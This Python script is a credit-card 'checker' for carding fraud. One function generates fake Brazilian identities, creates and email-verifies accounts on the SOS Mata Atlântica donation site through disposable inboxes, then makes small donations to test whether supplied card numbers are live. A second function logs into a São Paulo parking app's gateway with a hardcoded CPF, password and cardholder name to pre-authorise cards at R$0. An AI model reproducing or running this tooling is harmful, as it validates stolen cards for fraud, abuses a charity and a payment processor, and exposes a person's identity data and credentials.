from email import message
import requests, time, json,sys, random

import unidecode 

def corte(texto, inicio, final):
    
    if inicio in texto:
        if final in texto:
            texto = texto.split(inicio)[1].strip()
            texto = texto.split(final)[0].strip()
            return texto
        else:
            return 'final não encontrado'
    
    else:
        return 'inicio não encontrado'


def gerar_pessoa():

    headers = {
        'authority': 'www.4devs.com.br',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.4devs.com.br',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
    'acao': 'gerar_pessoa',
    'sexo': 'I',
    'pontuacao': 'N',
    'idade': '0',
    'cep_estado': '',
    'txt_qtde': '1',
    'cep_cidade': ''
    }

    response = requests.post('https://www.4devs.com.br/ferramentas_online.php', headers=headers, data=data)

    retorno = response.json()

    return retorno


def debito(cc):
    import requests

    try:
        card = cc.split('|')
        card = {
            "cc":card[0],
            "mes":card[1],
            "ano":card[2],
            "cvv":card[3],
        }
    except:
        return{
            "status":False,
            "live":False,
            "message": "Faltou algo no cartão",
        }

    mails = ["@boximail.com", "@dropjar.com", "@givmail.com", "@inboxbear.com", "@votomail.com", "@zetmail.com", "@tafmail.com"]

    provedor = random.choice(mails)


    session = requests.Session()

    # CRIAR CONTA DO USUÁRIO

    pessoa = gerar_pessoa()
    pessoa['nome'] = unidecode.unidecode(pessoa['nome']) 

    email = f"{pessoa['nome'].split(' ')[-1].lower()}{pessoa['cpf'][6:]}{provedor}"

    nascimento = "-".join(pessoa['data_nasc'].split("/")[::-1])



    headers = {
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.sosma.org.br',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.sosma.org.br/',
        'Accept-Language': 'pt-PT,pt;q=0.9',
    }

    json_data = {
        'first_name': f"{pessoa['nome'].split(' ')[0]} ",
        'last_name': pessoa['nome'].split(' ')[1],
        'document_number': pessoa['cpf'],
        'document_type': 'CPF',
        'email': email,
        'password': pessoa['senha'],
        'password_confirmation': pessoa['senha'],
        'birthday': nascimento,
        'mobile_number': pessoa['celular'],
        'region': pessoa['estado'],
        'subdivision_1': pessoa['cidade'],
        'optin': True,
        'terms': True,
    }

    response = session.post('https://api.sosma.org.br/donation/users', headers=headers, json=json_data)


    token = response.json()['access_token']

    # CRIAR O EMAIL

    headers = {
        'authority': 'getnada.com',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://getnada.com/',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    
    start = int(time.time())

    while True:
        response = session.get(f'https://getnada.com/api/v1/inboxes/{email}', headers=headers)

        retorno_email = response.json()
        if len(retorno_email['msgs']) > 0:
            if 'uid' in retorno_email['msgs'][0]:
                uid = retorno_email['msgs'][0]['uid']
                break


        print(int(time.time()) - start)
        if int(time.time()) - start >15:

            return {
                "status": False,
                "live": False,
                "message": f"Cliente não verificado",
            }

        time.sleep(0.5)

    # BUSCAR LINK DE VERIFICAÇÃO DO EMAIL
    headers = {
        'authority': 'getnada.com',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'iframe',
        'referer': f'https://getnada.com/message/{uid}',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    response = session.get(f'https://getnada.com/api/v1/messages/html/{uid}', headers=headers)


    link_ativacao = corte(response.text, 'color: #3869d4;" target="_blank">','</a>')

    #sys.exit()

    # FAZER A VERIFICAÇÃO
    response = session.get(link_ativacao)

    # FAZ LOGIN
    headers = {
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.sosma.org.br',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.sosma.org.br/',
        'Accept-Language': 'pt-PT,pt;q=0.9',
    }

    json_data = {
        'document': pessoa['cpf'],
        'password': pessoa['senha'],
    }

    response = session.post('https://api.sosma.org.br/donation/login', headers=headers, json=json_data)

    token_login = response.json()['access_token']

    time.sleep(1)

    # CHECKER

    headers = {
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'Accept': 'application/json',
        'Authorization': f"Bearer {token_login}",
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.sosma.org.br',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.sosma.org.br/',
        'Accept-Language': 'pt-PT,pt;q=0.9',
    }

    debito = [100,200,300]

    debito = random.choice(debito)

    json_data = {
        'corporate': False,
        'description': 'Doa\xE7\xE3o para SOS Mata Atl\xE2ntica',
        'amount_in_cents': debito,
        'transaction_type': 'CREDIT_CARD',
        'donation_type': 'CONTRIBUTION',
        'recurrent': False,
        'card': {
            'holder': pessoa['nome'],
            'number': card['cc'],
            'month': card['mes'],
            'year': card['ano'],
            'cvv': card['cvv'],
        },
    }
    response = session.post('https://api.sosma.org.br/donation/donations/card', headers=headers, json=json_data)


    if response.status_code == 201:
        if response.json()['status_type'] == 'PAID':
            return {
                "status": True,
                "live": True,
                "message": f"Gate2 Aprovado R${str(debito)[0]},{str(debito)[1:]}",
            }

        else:
            return {
                "status": True,
                "live": False,
                "message": f"Gate2 Recusou R${str(debito)[0]},{str(debito)[1:]}",
            }


def pre_auth(cc):
    try:
        card = cc.split('|')
        card = {
            "cc":card[0],
            "mes":card[1],
            "ano":card[2],
            "cvv":card[3],
        }
        
        if len(card['ano']) == 4:
            card['ano'] = f"{card['ano'][2:]}"


        
    except:
        return{
            "status":False,
            "live":False,
            "message": "Faltou algo no cartão",
        }


    session = requests.Session()


    headers = {
            'Accept-Charset': 'UTF-8',
            'Content-Type': 'application/json; charset=UTF-8',
            'Applicationid': '44',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; M2010J19CG MIUI/V12.0.10.0.QJFMIXM)',
            'Host': 'gtw.novazonaazuldigitalsp.com.br',
            'Connection': 'Keep-Alive'
        }


    id = "04347728018"

    data = '{"senha":"InfoWick","appData":{"bundleName":"br.com.estapar.sp.android"}}'

    response = session.post(f'https://gtw.novazonaazuldigitalsp.com.br/autenticacao/v1/{id}', headers=headers, data=data)
    print(response.text)
    
    try:
        token = response.json()['usuario']['token']
    except:
        message = response.json()['erro']['descricao']

        return {
                    "status": False,
                    "live": False,
                    "message": message
                }

    #print(token)

    

    headers = {
            'Accept-Charset': 'UTF-8',
            'Content-Type': 'application/json; charset=UTF-8',
            'Applicationid': '44',
            'Authorization': token,
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; M2010J19CG MIUI/V12.0.10.0.QJFMIXM)',
            'Host': 'gtw.novazonaazuldigitalsp.com.br',
            'Connection': 'Keep-Alive'
        }

    response = session.get(f"https://gtw.novazonaazuldigitalsp.com.br/getnet/v1/{id}/cartao/validar?numero={card['cc']}&bandeira=0&portador=ALLAN MACHADO VARGAS&mesExpiracao={card['mes']}&anoExpiracao={card['ano']}&cpfCnpj={id}&cvv={card['cvv']}&frotista=false" ,headers=headers)

    time.sleep(random.randint(4,8))
    try:
        response.json()

    except:
        return {
                    "status": True,
                    "live": False,
                    "message": "Gate 2 pre auth, sem retorno do checker"
                }

    if response.status_code == 200:
        return {
            "status": True,
            "live": True,
            "message": "Gate 2 Pagamento e dados verificados com R$0,00"
        }

            
    else:
        message = response.json()['erro']['descricao']
        if message == "Cartão inválido!":
            message = "Gate 2 Recusou R$0,00"

        return {
            "status": True,
            "live": False,
            "message": message
        }

